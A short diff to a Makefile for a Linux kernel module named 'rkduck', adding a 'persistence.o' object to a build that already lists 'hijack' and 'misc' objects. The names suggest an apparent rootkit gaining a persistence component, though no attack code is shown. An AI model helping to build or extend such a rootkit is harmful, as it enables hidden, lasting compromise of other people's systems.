@@ -1,5 +1,5 @@
 obj-m += rkduck.o
-rkduck-objs = duck.o hijack.o misc.o
+rkduck-objs = duck.o hijack.o misc.o persistence.o
 
 KERNEL = $(shell uname -r)
 PWD = $(shell pwd)
